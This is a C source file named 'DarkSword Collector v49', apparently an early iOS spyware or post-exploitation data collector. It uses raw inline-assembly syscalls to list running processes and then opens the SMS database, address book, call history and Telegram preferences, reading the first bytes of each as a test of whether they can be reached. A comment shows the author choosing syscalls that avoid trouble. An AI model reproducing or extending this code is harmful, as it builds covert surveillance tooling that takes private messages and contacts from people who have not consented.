/**
 * DarkSword Collector v49 - Process enumeration via sysctl
 * Use sysctl(KERN_PROC) to list running processes
 * This is a BSD syscall, not a Mach trap - should be safe
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define SYS_lseek 199
#define SYS_sysctl 202
#define SYS_getpid 20
#define SEEK_SET 0
#define O_RDONLY 0

static volatile int g_ctx = 0;

/* sysctl: CTL_KERN=1, KERN_PROC=14, KERN_PROC_ALL=0 */
/* int sysctl(int *name, u_int namelen, void *oldp, size_t *oldlenp, void *newp, size_t newlen) */

int ds_start(void) {
    int ctx = g_ctx;

    if (ctx == 0) {
        /* Phase 0: Get PID and read known-good files */
        long pid = _svc1(SYS_getpid, 0);

        /* Read /etc/hosts first byte */
        int fd = (int)_svc2(SYS_open, (long)"/etc/hosts", O_RDONLY);
        unsigned char hb = 0;
        if (fd >= 0) {
            _svc3(SYS_read, fd, (long)&hb, 1);
            _svc1(SYS_close, fd);
        }

        g_ctx = 1;
        return ((int)pid & 0xFFFF) | (((int)hb & 0xFF) << 16) | (0x01 << 24);
    }

    if (ctx == 1) {
        /* Phase 1: Try sysctl to enumerate processes */
        int mib[4] = {1, 14, 0, 0}; /* CTL_KERN, KERN_PROC, KERN_PROC_ALL */
        unsigned char buf[4096];
        for (int i = 0; i < 4096; i++) buf[i] = 0;
        long buflen = 4096;

        long result = _svc4(SYS_sysctl, (long)mib, 4, (long)buf, (long)&buflen);

        /* Return: sysctl result in low bits, buffer first 4 bytes */
        int first4 = (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);

        g_ctx = 2;
        return ((int)result & 0xFF) | (first4 & 0xFFFFFF00);
    }

    if (ctx >= 2 && ctx < 7) {
        /* Phase 2-6: Read more files */
        static const char *files[] = {
            "/var/mobile/Library/Preferences/.GlobalPreferences.plist",
            "/var/mobile/Library/Preferences/ph.telegra.Telegraph.plist",
            "/var/mobile/Library/SMS/sms.db",
            "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
            "/var/mobile/Library/CallHistoryDB/CallHistory.storedata"
        };
        int fidx = ctx - 2;
        int fd = (int)_svc2(SYS_open, (long)files[fidx], O_RDONLY);
        if (fd < 0) { g_ctx = ctx + 1; return 0xFE000000 | fidx; }

        unsigned char buf[4] = {0};
        int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
        _svc1(SYS_close, fd);

        g_ctx = ctx + 1;
        if (n < 1) return 0xEE000000 | fidx;
        return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
    }

    g_ctx = 0;
    return 0xFFFFFFFF;
}
